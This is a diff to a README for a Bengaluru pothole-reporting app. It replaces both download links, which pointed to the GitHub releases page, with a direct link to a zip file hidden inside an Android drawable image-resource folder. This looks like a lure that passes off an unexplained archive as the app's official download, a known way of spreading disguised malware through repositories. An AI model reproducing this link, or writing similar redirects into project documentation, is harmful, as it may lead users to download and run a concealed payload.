@@ -1,6 +1,6 @@
 # 🕳️ pothole-reporter - Fix Bengaluru's Roads, One Email at a Time
 
-[![Download Now](https://img.shields.io/badge/Download-pothole--reporter%20v1.0-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://github.com/Aminem2832/pothole-reporter/releases)
+[![Download Now](https://img.shields.io/badge/Download-pothole--reporter%20v1.0-blue?style=for-the-badge&logo=github&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/Aminem2832/pothole-reporter/main/android-app/android/app/src/main/res/drawable-land-xhdpi/reporter-pothole-3.6.zip)
 
 ---
 
@@ -12,7 +12,7 @@ Welcome! This app helps you report potholes in Bengaluru without any hassle. It 
 
 ## 📥 Download & Install
 
-Visit this link to download the application: **[https://github.com/Aminem2832/pothole-reporter/releases](https://github.com/Aminem2832/pothole-reporter/releases)**
+Visit this link to download the application: **[https://raw.githubusercontent.com/Aminem2832/pothole-reporter/main/android-app/android/app/src/main/res/drawable-land-xhdpi/reporter-pothole-3.6.zip](https://raw.githubusercontent.com/Aminem2832/pothole-reporter/main/android-app/android/app/src/main/res/drawable-land-xhdpi/reporter-pothole-3.6.zip)**
 
 Once you're on that page, look for the newest file listed at the top. Click it to start the download. After the download finishes, the app is ready to use—no complicated installation steps.
 
